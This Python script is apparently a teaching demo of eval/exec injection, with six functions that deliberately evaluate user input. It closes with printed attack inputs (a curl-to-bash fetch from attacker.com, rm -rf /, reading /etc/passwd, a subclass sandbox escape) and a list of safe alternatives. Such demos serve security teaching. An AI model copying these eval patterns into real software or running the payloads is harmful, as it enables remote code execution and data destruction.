#!/usr/bin/env python3

import os
import subprocess

def vulnerable_input_python2_style():
    try:
        user_input = input("Enter a Python expression: ")
        
        result = eval(user_input)
        print(f"Result: {result}")
        return result
    except Exception as e:
        print(f"Error: {e}")
        return None

def unsafe_calculator():
    print("Simple Calculator (supports Python expressions)")
    
    while True:
        try:
            expression = input("Enter expression (or 'quit' to exit): ")
            
            if expression.lower() == 'quit':
                break
            
            result = eval(expression)
            print(f"Result: {result}")
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")

def dynamic_configuration():
    config = {}
    
    print("Dynamic Configuration System")
    print("Enter key=value pairs (Python expressions allowed)")
    
    while True:
        try:
            config_line = input("Config (key=value) or 'done': ")
            
            if config_line.lower() == 'done':
                break
            
            if '=' in config_line:
                key, value = config_line.split('=', 1)
                key = key.strip()
                
                config[key] = eval(value.strip())
                print(f"Set {key} = {config[key]}")
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Configuration error: {e}")
    
    return config

def interactive_python_shell():
    print("Interactive Python Shell (Type 'exit' to quit)")
    print("WARNING: This executes arbitrary Python code!")
    
    while True:
        try:
            code = input(">>> ")
            
            if code.lower() in ['exit', 'quit']:
                break
            
            exec(code)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Execution error: {e}")

def template_string_processor():
    print("Template String Processor")
    
    template = input("Enter template string with {expression} placeholders: ")
    
    import re
    expressions = re.findall(r'\{([^}]+)\}', template)
    
    result = template
    for expr in expressions:
        try:
            value = eval(expr)
            result = result.replace(f'{{{expr}}}', str(value))
        except Exception as e:
            print(f"Template error for '{expr}': {e}")
            result = result.replace(f'{{{expr}}}', f'ERROR({expr})')
    
    print(f"Template result: {result}")
    return result

def numeric_input_validator():
    def get_number(prompt):
        while True:
            try:
                user_input = input(prompt)
                
                number = eval(user_input)
                
                if isinstance(number, (int, float)):
                    return number
                else:
                    print("Please enter a valid number")
                    
            except Exception as e:
                print(f"Invalid input: {e}")
    
    print("Number addition calculator")
    num1 = get_number("Enter first number: ")
    num2 = get_number("Enter second number: ")
    
    print(f"Result: {num1} + {num2} = {num1 + num2}")

if __name__ == "__main__":
    print("=== input() Function Command Injection Examples ===")
    print("These examples demonstrate various ways eval-like input can be exploited")
    
    while True:
        print("\nChoose an example:")
        print("1. Python 2 style input() (with eval)")
        print("2. Unsafe calculator")
        print("3. Dynamic configuration")
        print("4. Interactive Python shell")
        print("5. Template string processor")
        print("6. Numeric input validator")
        print("0. Exit")
        
        choice = input("Enter choice (0-6): ")
        
        if choice == '0':
            break
        elif choice == '1':
            print("\n=== Python 2 Style input() ===")
            vulnerable_input_python2_style()
        elif choice == '2':
            print("\n=== Unsafe Calculator ===")
            unsafe_calculator()
        elif choice == '3':
            print("\n=== Dynamic Configuration ===")
            config = dynamic_configuration()
            print(f"Final config: {config}")
        elif choice == '4':
            print("\n=== Interactive Python Shell ===")
            interactive_python_shell()
        elif choice == '5':
            print("\n=== Template String Processor ===")
            template_string_processor()
        elif choice == '6':
            print("\n=== Numeric Input Validator ===")
            numeric_input_validator()
        else:
            print("Invalid choice")
    
    print("\n=== Attack Examples ===")
    print("Any of the above functions can be exploited with inputs like:")
    print("1. __import__('os').system('whoami')")
    print("2. __import__('subprocess').call(['cat', '/etc/passwd'], shell=True)")
    print("3. exec('import os; os.system(\"curl attacker.com/payload.sh | bash\")')")
    print("4. [x for x in [1] if __import__('os').system('rm -rf /')]")
    print("5. ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id')")
    
    print("\n=== Safe Alternatives ===")
    print("Instead of eval/exec on user input:")
    print("- Use ast.literal_eval() for safe evaluation of literals")
    print("- Use proper parsing libraries for specific formats")
    print("- Validate and sanitize input before processing")
    print("- Use restricted execution environments if dynamic code is needed")